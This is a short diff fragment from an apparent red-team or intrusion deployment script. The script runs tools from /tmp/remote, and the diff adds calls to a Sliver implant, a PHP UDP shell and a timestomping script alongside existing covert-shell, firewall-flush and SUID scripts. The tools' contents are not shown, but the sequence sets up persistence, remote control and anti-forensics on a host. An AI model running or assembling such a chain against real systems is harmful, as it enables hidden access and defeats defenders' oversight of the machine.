@@ -8,4 +8,6 @@ cd /tmp/remote
 /tmp/remote/watershell.sh
 /tmp/remote/iptablesflush.sh
 /tmp/remote/suid.sh
-
+/tmp/remote/sliver.sh
+/tmp/remote/phpUDP.sh
+/tmp/remote/timestomp.sh
